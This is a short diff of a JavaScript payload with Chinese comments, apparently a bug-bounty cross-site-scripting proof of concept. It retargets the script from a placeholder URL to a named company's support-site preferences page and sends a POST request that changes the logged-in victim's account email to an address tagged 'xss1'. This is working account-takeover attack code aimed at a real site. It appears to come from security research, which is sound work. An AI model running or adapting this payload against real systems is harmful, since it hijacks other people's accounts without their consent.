@@ -1,4 +1,4 @@
-fetch('https://www.dfdfd.com/') // 确保替换为目标网站正确的URL
+fetch('https://qa-support.cloud.cambiumnetworks.com/preferences') // 确保替换为目标网站正确的URL
     .then(response => {
         if (!response.ok) {
             throw new Error('Network response was not ok');
@@ -23,7 +23,7 @@ fetch('https://www.dfdfd.com/') // 确保替换为目标网站正确的URL
             formData.append('newemail', 'esperamier+xss1@intigriti.me');
             formData.append('request', 'request');
             
-            fetch(url, {
+            fetch("https://qa-support.cloud.cambiumnetworks.com/preferences/email", {
                 method: 'POST',
                 headers: {
                     // 注意：使用FormData时，不需要手动设置Content-Type头部，浏览器会自动设置
